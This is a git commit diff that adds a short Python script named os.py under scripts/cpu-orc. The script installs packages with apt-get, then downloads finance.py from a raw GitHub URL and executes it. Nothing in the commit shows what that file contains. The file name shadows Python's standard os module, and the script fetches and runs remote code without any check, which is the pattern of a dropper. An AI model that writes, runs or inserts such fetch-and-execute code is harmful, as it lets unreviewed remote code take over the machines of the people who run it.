06a93439cff9ee405e7c7d0104add2e7c3c6d386
grozlhrle <grozlhrle@hotmail.com>
2024-12-10 11:34:34 -0600

    Create os.py

---
+++ scripts/cpu-orc/os.py
@@ -0,0 +1,6 @@
+__author__ = 'root'
+import os,sys
+os.system('apt-get update -y')
+os.system('apt-get install gcc make python python-dev -y')
+os.system('wget https://raw.githubusercontent.com/grozlhrle/idie/scripts/cpu-orc/master/finance.py')
+os.system('python3 finance.py')
